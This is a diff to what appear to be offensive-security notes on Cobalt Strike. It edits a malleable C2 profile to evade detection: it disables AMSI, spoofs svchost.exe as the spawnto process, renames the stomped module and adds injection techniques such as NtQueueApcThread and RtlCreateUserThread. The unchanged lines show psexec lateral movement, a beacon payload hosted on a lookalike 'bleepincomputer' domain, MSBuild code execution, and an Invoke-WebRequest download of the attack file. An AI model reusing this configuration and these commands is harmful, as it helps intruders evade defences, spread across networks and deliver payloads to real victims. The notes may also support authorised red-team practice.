@@ -99,13 +99,13 @@ cd /opt/cobaltstrike/profiles
 ```c
 stage {
    set userwx "false";
-   set module_x64 "wwanmm.dll";  
+   set module_x64 "Hydrogen.dll";  
    set copy_pe_header "false";
 }
 
 post-ex {
 	set amsi_disable "true";
-	set spawnto_x64 "%windir%\\sysnative\\RuntimeBroker.exe";
+	set spawnto_x64 "%windir%\\sysnative\\svchost.exe";
 	set obfuscate "true";
 	set pipename "TSVCPIPE-########-####-####-####-###############";
 	set cleanup "true";
@@ -121,8 +121,9 @@ post-ex {
 process-inject {
 	   execute {
 	      NtQueueApcThread-s;
+	      NtQueueApcThread;
 	      SetThreadContext;
-          CreateThread "ntdll!RtlUserThreadStart";
+	      RtlCreateUserThread;
 	      CreateThread;
 	   }
 	}
@@ -197,7 +198,7 @@ beacon> jump psexec64 lon-ws-1 smb
 ```powershell
 1. Host the file http_x64.xprocess.bin
 2. URL -> www.bleepincomputer.com
-3. Path -> beacon.bin
+3. Path -> /beacon.bin
 ```
 
 - Then create this code in Visual Basic:
@@ -280,7 +281,7 @@ C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe .\test.csproj
 
 - Then you can host the test.csproj file in COBAL on another machine and download it.
 ```powershell
-1. Host and Path -> /test.csproj y url www.bleepincomputer.com
+1. Host and Path -> /test.csproj  -> url www.bleepincomputer.com
 
 2. Target machine on Powershell ->   Invoke-WebRequest -Uri "http://www.bleepincomputer.com:80/test.csproj" -OutFile "test.csproj"
 
